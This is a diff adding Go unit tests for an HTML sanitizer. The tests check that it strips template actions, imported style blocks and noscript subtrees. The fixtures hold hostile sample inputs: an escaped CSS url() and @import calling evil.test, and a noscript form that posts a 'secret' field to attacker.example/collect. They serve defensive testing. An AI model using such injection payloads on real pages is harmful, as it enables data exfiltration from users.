@@ -123,3 +123,52 @@ func TestSanitizeKeepsTemplateDelimitersLiteral(t *testing.T) {
 		t.Fatal("untrusted imported template expression became active")
 	}
 }
+
+func TestSanitizeKeepsFragmentLinksLocalAndOmitsBase(t *testing.T) {
+	base, _ := url.Parse("https://example.test/path/page?x={{.Email}}")
+	got, err := Sanitize(`<html><body><a href="#pricing">Pricing</a><img src="img/logo.png"></body></html>`, base)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(got, "<base ") {
+		t.Fatalf("generated base element must be omitted: %s", got)
+	}
+	if !strings.Contains(got, `href="#pricing"`) {
+		t.Fatalf("fragment link must remain document-local: %s", got)
+	}
+	if !strings.Contains(got, `src="https://example.test/path/img/logo.png"`) {
+		t.Fatalf("relative resource must still resolve absolutely: %s", got)
+	}
+	if strings.Contains(got, "{{.Email}}") {
+		t.Fatalf("attacker-controlled template action survived sanitization: %s", got)
+	}
+}
+
+func TestSanitizeDiscardsImportedStyleBlocks(t *testing.T) {
+	base, _ := url.Parse("https://example.test/path/")
+	got, err := Sanitize(`<html><head><style>.hero{background:u\\72l(http://evil.test/hero.png)} @import "https://evil.test/x.css";</style><style>.safe{color:red}</style></head><body></body></html>`, base)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, forbidden := range []string{"hero.png", "@import", "evil.test", ".safe{color:red}", "<style"} {
+		if strings.Contains(got, forbidden) {
+			t.Fatalf("imported stylesheet content survived (%s): %s", forbidden, got)
+		}
+	}
+}
+
+func TestSanitizeDiscardsNoscriptSubtrees(t *testing.T) {
+	input := `<html><head><noscript><link rel="stylesheet" href="https://attacker.example/evil.css"></noscript></head><body><noscript><form action="https://attacker.example/collect"><input name="secret"><iframe src="https://attacker.example/frame"></iframe></form></noscript><p>safe</p></body></html>`
+	got, err := Sanitize(input, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, forbidden := range []string{"<noscript", "attacker.example", "name=\"secret\"", "<iframe", "<form"} {
+		if strings.Contains(got, forbidden) {
+			t.Fatalf("noscript subtree survived sanitization (%s): %s", forbidden, got)
+		}
+	}
+	if !strings.Contains(got, "<p>safe</p>") {
+		t.Fatalf("ordinary content was removed with noscript: %s", got)
+	}
+}
